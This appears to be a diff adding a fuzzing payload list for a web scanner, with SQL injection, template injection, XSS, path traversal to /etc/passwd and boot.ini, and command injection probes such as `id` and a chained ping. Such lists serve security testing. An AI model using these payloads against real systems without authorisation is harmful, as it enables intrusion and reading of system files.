@@ -1,0 +1,39 @@
+'
+''
+\
+\\
+{base}-0
+{base}*1
+{base}'||'
+{base}'+'
+{base}' '
+"
+""
+{base}"||"
+{base}/*_*/
+'{base}'
+"{base}"
+({base})
+`
+{base}'--
+{base}')-- 
+{base}'))-- 
+{base}'#
+{base}')# 
+{base}'))# 
+{base}' and 'z'='z
+{base}' or 'z'='z
+{base}" or "z"="z
+}}
+${77*77}
+{{77*77}}
+xsstest'"><
+/{base}
+./{base}
+../{base}
+../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+{base}))))))))))
+{base}|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+`id`
+{base};echo 111111
